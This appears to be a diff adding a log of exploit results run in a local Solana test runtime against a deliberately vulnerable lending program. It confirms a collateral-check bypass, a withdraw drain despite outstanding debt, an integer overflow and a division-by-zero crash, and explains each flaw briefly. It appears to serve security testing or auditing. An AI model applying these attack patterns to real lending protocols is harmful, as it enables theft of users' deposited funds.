@@ -1,0 +1,100 @@
+═══════════════════════════════════════════════════════════
+ BANKRUN EXPLOIT EXECUTION RESULTS
+ Binary: vuln_lending.so (compiled SBF via cargo-build-sbf)
+ Runtime: solana-bankrun (in-process Solana runtime)
+═══════════════════════════════════════════════════════════
+
+=== SEM-001: Collateral Bypass ===
+═══════════════════════════════════════════════════════════
+ EXPLOIT: Collateral Check Bypass (SEM-001)
+ Target: vulnerable_lending::borrow()
+ Binary: vuln_lending.so (compiled SBF)
+═══════════════════════════════════════════════════════════
+
+[1] Genesis accounts loaded:
+    Pool: deposited=600 SOL, borrows=0
+    User: deposited=100 SOL, borrowed=0
+    Vault: 600 SOL
+
+[2] EXPLOIT: Borrowing 100 SOL repeatedly...
+    (check is: deposited >= amount, ignores existing debt)
+
+    Borrow #1: 100 SOL (cumulative debt: 100 SOL)
+    Borrow #2: 100 SOL (cumulative debt: 200 SOL)
+    Borrow #3: 100 SOL (cumulative debt: 300 SOL)
+    Borrow #4: 100 SOL (cumulative debt: 400 SOL)
+    Borrow #5: 100 SOL (cumulative debt: 500 SOL)
+
+[3] Reading final account state...
+    Deposited: 100 SOL
+    Borrowed:  500 SOL
+    Debt ratio: 500%
+
+═══════════════════════════════════════════════════════════
+ >>> EXPLOIT CONFIRMED on compiled SBF binary <<<
+ Borrowed 500 SOL with only 100 SOL collateral
+ 500% debt ratio — should be capped at 75%
+ Borrows executed: 5 (should be max 1 at 75% LTV)
+═══════════════════════════════════════════════════════════
+
+=== SEM-002: Withdraw Drain ===
+═══════════════════════════════════════════════════════════
+ EXPLOIT: Withdraw Drain (SEM-002)
+ Target: vulnerable_lending::withdraw()
+ Binary: vuln_lending.so (compiled SBF)
+═══════════════════════════════════════════════════════════
+
+[1] State setup (simulates: attacker deposited 100, borrowed 90):
+    Pool: deposits=600 SOL, borrows=90 SOL
+    User: deposited=100 SOL, borrowed=90 SOL
+    Vault: 510 SOL
+
+[2] EXPLOIT: Withdrawing 100 SOL despite 90 SOL outstanding debt...
+    Withdrawal SUCCEEDED (should have been blocked)
+
+[3] Reading final account state...
+    Deposited (on-chain): 0 SOL
+    Borrowed (outstanding): 90 SOL
+    Collateral remaining: 0 SOL
+    Attacker SOL gained: 100.0000 SOL
+
+═══════════════════════════════════════════════════════════
+ >>> EXPLOIT CONFIRMED on compiled SBF binary <<<
+ Deposited 100 SOL -> Borrowed 90 SOL -> Withdrew 100 SOL
+ Protocol has 90 SOL bad debt with 0 collateral
+ Attacker gained ~100.0 SOL net (90 SOL stolen)
+═══════════════════════════════════════════════════════════
+
+=== SEM-003/004: Overflow + Division by Zero ===
+═══════════════════════════════════════════════════════════
+ EXPLOIT: Integer Overflow + Division by Zero (SEM-003/004)
+ Target: vulnerable_lending::liquidate()
+ Binary: vuln_lending.so (compiled SBF)
+═══════════════════════════════════════════════════════════
+
+--- TEST A: Integer Overflow ---
+
+[1] Overflow scenario:
+    borrowed: 1000000000 lamports
+    interest_rate: 500, total_borrows: 36893488147
+    Honest interest: 18446744073500000000000 (overflows u64)
+    u64 wrapped:     18446743864157935616
+
+[2] Calling liquidate (user IS underwater, but overflow hides it)...
+    Liquidation succeeded (user correctly found underwater)
+
+--- TEST B: Division by Zero ---
+
+[3] Calling liquidate with zero-borrow user...
+    health = deposited * 100 / (borrowed + interest)
+    health = 10_000_000_000 * 100 / (0 + 0) => DIVISION BY ZERO
+
+    attempt to divide by zero
+    Program CRASHED: Failed to process transaction: transport transaction error: Error processing Instruction 0: Program failed to complete
+    (confirms division by zero causes program panic)
+
+═══════════════════════════════════════════════════════════
+ EXPLOIT RESULTS (compiled SBF binary):
+   Integer overflow (SEM-003): Result: liquidation_succeeded
+   Division by zero (SEM-004): CONFIRMED --- program panics on zero borrows
+═══════════════════════════════════════════════════════════
